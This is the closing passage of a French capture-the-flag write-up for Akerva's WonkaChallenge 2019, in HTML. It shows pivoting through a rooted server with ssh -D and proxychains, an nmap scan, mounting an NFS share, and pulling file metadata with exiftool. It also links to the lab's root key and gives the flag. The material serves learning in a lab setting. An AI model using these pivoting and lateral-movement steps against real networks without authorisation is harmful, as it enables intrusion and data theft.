+<li>Mettre en place un <strong>proxychains</strong> avec la machine précédente en tant que pivot ;</li>
+<li>Faire un scan de port avec nmap sur la nouvelle cible, voir le <code>nfs</code> sur le port 2049 ;</li>
+<li>Monter le nfs distant sur la machine de pivot ;</li>
+<li>Copier les fichiers du partage réseau ;</li>
+<li>Analyser les métadonnées avec <strong>exiftool</strong> et trouver que <strong>Grandma Josephine</strong> est le chef de <em>Willy Wonka</em>.</li>
+</ol>
+
+<hr />
+
+<h3 id="xiii-1-post-exploitation">XIII.1. Post exploitation</h3>
+
+<p>Le schéma trouvé sur le serveur <em>SRV01-INTRANET</em> est incomplet. En effet, la machine <strong>SRV03-FILER</strong> est tagguée en tant que &ldquo;TODO&rdquo;. L&rsquo;épreuve finale doit consister en l&rsquo;accès à cette dernière machine. Avant de passer à la suite, il convient de se connecter en <em>root</em> au serveur <em>SRV02-BACKUP</em> avec un réel accès SSH. La clé privée est disponible <a href="https://mega.nz/#!q25BzSLZ!w9_4B8q7YTCgrUoMYkWPmyRn374xBZhxarUtYmgJJGc">ici</a>.</p>
+
+<p>L&rsquo;objectif est de trouver le chef de <em>Willy Wonka</em>. Comme pour la première étape de la dixième épreuve (cf. X.1. Reconnaissance), il est intéressant de vérifier le contenu du cache arp :</p>
+
+<pre><code class="language-bash">(SRV02-BACKUP as root) ➜ cat /proc/net/arp
+IP address       HW type     Flags       HW address            Mask     Device
+172.16.69.23     0x1         0x2         ce:d3:94:6c:38:3f     *        ens18
+172.16.69.78     0x1         0x2         7a:0a:61:1a:36:65     *        ens18
+172.16.69.254    0x1         0x2         3e:20:13:a5:09:49     *        ens18
+</code></pre>
+
+<p>Une nouvelle IP est apparut : <strong>172.16.69.23</strong>. Sûrement la machine nommée <strong>SRV03-FILER</strong>. Celle-ci n&rsquo;a pas l&rsquo;air accessible directement malgré les routes en place. Cependant, ayant un accès SSH à la machine <em>SRV02-BACKUP</em>, il est possible de faire un pivot.</p>
+
+<h3 id="xiii-2-mise-en-place-du-pivot">XIII.2. Mise en place du pivot</h3>
+
+<p>Pour faire un pivot, il existe au moins deux outils pertinents : <strong>proxychains</strong> et <strong>sshuttle</strong>. Dans les deux cas, il est nécessaire de faire suivre un port de la machine pivot (SRV02-BACKUP) et la machine de l&rsquo;attaquant (KaliVM). Pour cette configuration, l&rsquo;architecture présentée dans l&rsquo;introduction a été abandonnée. Le <em>VPN du WonkaChall</em> est directement dans la <em>KaliVM</em>.</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ ssh -D 1080 root@172.16.69.65 -i ./id_rsa_root
+</code></pre>
+
+<p>La configuration de proxychains :</p>
+
+<pre><code class="language-bash">[...]
+# Quiet mode (no output from library)
+quiet_mode
+[...]
+socks4 	127.0.0.1 1080
+</code></pre>
+
+<p>Le pivot est désormais mis en place. Il est possible pour la <em>KaliVM</em> d&rsquo;accéder à <strong>SRV03-FILER</strong>.</p>
+
+<h3 id="xiii-3-scan-de-port">XIII.3. Scan de port</h3>
+
+<p>Le scan de port devenant une coutume lors de la découverte d&rsquo;un nouvel hôte, celui-ci ne va pas échapper à la règle :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ proxychains nmap -F -sT -Pn -T4 -vvv 172.16.69.23 
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-22 01:16 CEST
+[...]
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack
+111/tcp  open  rpcbind syn-ack
+2049/tcp open  nfs     syn-ack
+</code></pre>
+
+<p>En considérant les trois ports ouverts, l&rsquo;hypothèse la plus probable est l&rsquo;accès au <strong>Network File System</strong> (nfs) sur le port <em>2049/tcp</em>.</p>
+
+<h3 id="xiii-4-montage-du-volume-nfs">XIII.4. Montage du volume NFS</h3>
+
+<p>La tentative de montage en passant par <em>proxychains</em> est un échec. La solution la plus simple est de monter ce volume sur le serveur <em>SRV02-BACKUP</em> :</p>
+
+<pre><code class="language-bash">(SRV02-BACKUP as root) ➜ mkdir /tmp/a
+(SRV02-BACKUP as root) ➜ mount -t nfs 172.16.69.23:/ /tmp/a
+(SRV02-BACKUP as root) ➜ ls /tmp/a
+DATA
+</code></pre>
+
+<p>Le volume est monté avec succès. Il contient beaucoup <em>d&rsquo;images</em>, un <em>docx</em> et un <em>pdf</em> :</p>
+
+<pre><code class="language-bash">(SRV02-BACKUP as root) ➜  ls -laR /tmp/a/DATA
+[...]
+./pictures:
+total 11652
+drwxr-x--x  2 nobody nogroup    4096 juil.  4 10:51 .
+drwxr-xr-x 11 root   root       4096 juin  24 17:43 ..
+-rw-r--r--  1 nobody nogroup  131823 juil.  4 10:50 ascenseurRedTeam.png
+-rw-r--r--  1 nobody nogroup 1901579 juil.  4 10:50 cinemaRedTeam.png
+-rw-r--r--  1 nobody nogroup  196371 juil.  4 10:50 croissantageSaif.png
+-rw-r--r--  1 nobody nogroup  130839 juil.  4 10:50 demenagement.png
+-rw-r--r--  1 nobody nogroup  153995 juil.  4 10:50 glace.png
+-rw-r--r--  1 nobody nogroup   37247 juil.  4 10:50 kenkenken.png
+-rw-r--r--  1 nobody nogroup  138224 juil.  4 10:50 keskiamaintenant.png
+-rw-r--r--  1 nobody nogroup  190794 juil.  4 10:50 miam.png
+-rw-r--r--  1 nobody nogroup  116749 juil.  4 10:50 newyork.png
+-rw-r--r--  1 nobody nogroup   86819 juil.  4 10:50 notredame.png
+-rw-r--r--  1 nobody nogroup  965251 juil.  4 10:50 onPartEnRestitution.jpg
+-rw-r--r--  1 nobody nogroup 2196730 juil.  4 10:50 onVeutDuPain.png
+-rw-r--r--  1 nobody nogroup 1039727 juil.  4 10:50 plage.png
+-rw-r--r--  1 nobody nogroup  104879 juil.  4 10:50 redabogoss.png
+-rw-r--r--  1 nobody nogroup  137275 juil.  4 10:50 redaSport.png
+-rw-r--r--  1 nobody nogroup 2043318 juil.  4 10:50 rootagedADsurDouchette.png
+-rw-r--r--  1 nobody nogroup  182331 juil.  4 10:50 rootagedemeres.png
+-rw-r--r--  1 nobody nogroup 1968672 juil.  4 10:50 soireeAvantPentest.png
+-rw-r--r--  1 nobody nogroup   69753 juil.  4 10:50 soireepicol.png
+-rw-r--r--  1 nobody nogroup   93357 juil.  4 10:50 toiletteAmehdi.png
+[...]
+./VIP:
+total 408
+drwxr-x--x  2 nobody nogroup   4096 juil.  5 16:59 .
+drwxr-xr-x 11 root   root      4096 juin  24 17:43 ..
+-rw-r--r--  1 nobody nogroup  88168 juil.  5 16:58 flag_lol.jpg
+-rw-r--r--  1 nobody nogroup  30234 juil.  3 19:15 INVOICE.docx
+-rw-r--r--  1 nobody nogroup 127983 juil.  3 19:15 INVOICE.pdf
+-rw-r--r--  1 nobody nogroup 152189 juil.  5 16:58 whiteboard.jpg
+</code></pre>
+
+<p>L&rsquo;identité du chef de Willy Wonka doit se trouver dans les métadonnées d&rsquo;un des fichiers du volume.</p>
+
+<h3 id="xiii-5-copie-des-fichiers-du-volume">XIII.5. Copie des fichiers du volume</h3>
+
+<p>Encore une fois, la solution la plus simple et la plus rapide reste de copier l&rsquo;ensemble des fichiers du dossier <strong>VIP</strong> sur <em>KaliVM</em> :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ scp -r -i ../id_rsa_root root@172.16.69.65:/tmp/a/DATA/VIP/ .    
+INVOICE.pdf                                                                       100%  125KB   1.9MB/s   00:00    
+flag_lol.jpg                                                                      100%   86KB   2.6MB/s   00:00    
+INVOICE.docx                                                                      100%   30KB   1.9MB/s   00:00    
+whiteboard.jpg                                                                    100%  149KB   3.1MB/s   00:00  
+
+(KaliVM) ➜ exiftool * | grep -i 'author'
+Author                          : Grandma Josephine
+</code></pre>
+
+<p>Le flag final est le SHA256 de &ldquo;Grandma Josephine&rdquo;.</p>
+
+<h3 id="xiii-6-flag">XIII.6. Flag</h3>
+
+<blockquote>
+<p>b8a3ef108d0c3fac75f3f99f4d6465db8b85b29f41edcfb419a986ca861239f9</p>
+</blockquote>
+
+<hr />
+
+<h3 id="resources-10">Resources</h3>
+
+<ol>
+<li><strong>Bima Fajar Ramadhan</strong>, <em>ProxyChains Tutorial</em>, linuxhint : <a href="https://linuxhint.com/proxychains-tutorial/">https://linuxhint.com/proxychains-tutorial/</a></li>
+<li><strong>Equipe de developpez</strong>, <em>NFS : le partage de fichiers sous Unix</em>, developpez.com : <a href="https://linux.developpez.com/formation_debian/nfs.html">https://linux.developpez.com/formation_debian/nfs.html</a></li>
+</ol>
+
+<hr />
+
+<hr />
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Pour conclure, le WonkaChallenge d&rsquo;Akerva m&rsquo;a permis de travailler sur des technologies à jour, et ça a été vraiment agréable. La difficulté globale du challenge a bien été dosée, malgré les différentes catégories parcourues. D&rsquo;un point de vue plus personnel, j&rsquo;ai appris plusieurs choses : interagir avec des bucket s3, déployer une application via host-manager pour exploiter un serveur tomcat, le resource based constrained delegation pour impersonate un utilisateur sur l&rsquo;active directory et enfin le ret2plt.</p>
+
+<p>Enfin, l&rsquo;infrastructure du challenge a très bien résisté à l&rsquo;assaut de plusieurs dizaines (centaines ?) de challengers. C&rsquo;était agréable de pouvoir travailler sur le challenge sans bugs ou autres problèmes de stabilité. Seule l&rsquo;utilisation du psexec juste après l&rsquo;exploitation du rbcd a été un peu chaotique.</p>
+
+<p>Pour clore ce writeup, je souhaite remercier l&rsquo;équipe d&rsquo;Akerva en charge du challenge. C&rsquo;était de belles épreuves, et j&rsquo;ai hâte de jouer le Wonka3 l&rsquo;année prochaine !</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/flag_lol.jpg" alt="" />
+<em>Fig 46</em> : Image de l&rsquo;équipe d&rsquo;Akerva, disponible dans le NFS de SRV03-FILER
+</center></p>
+
+	</div>
+</article>
+
+		</div>
+		
+	
+<script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js" integrity="sha256-l1iMQ6f0+8aFBzSNRxgklLlYMqu5S4b/LpaST2s+gog= sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy sha512-3dlGoFoY39YEcetqKPULIqryjeClQkr2KXshhYxFXNZAgRFZElUW9UQmYkmQE1bvB8tssj3uSKDzsj8rA04Meg==" crossorigin="anonymous"></script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw= sha384-ZeLYJ2PNSQjvogWP559CDAf02Qb8FE5OyQicqtz/+UhZutbrwyr87Be7NPH/RgyC sha512-ExaEi+x+Zqq50MIBraxsK23lQQJZd8Q7ZDlwJsxQwsWlO8XvRouQev9ZWaFxCKdTvrgb2fmf2pglwGp61/7qZA==" crossorigin="anonymous"></script>
+	
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+	
+
+
+	<script>
+    (function() {
+      var toc = document.getElementById('TableOfContents');
+      if (!toc) return;
+      do {
+        var li, ul = toc.querySelector('ul');
+        if (ul.childElementCount !== 1) break;
+        li = ul.firstElementChild;
+        if (li.tagName !== 'LI') break;
+        
+        ul.outerHTML = li.innerHTML;
+      } while (toc.childElementCount >= 1);
+    })();
+  </script>
+
+	</body>
+</html>
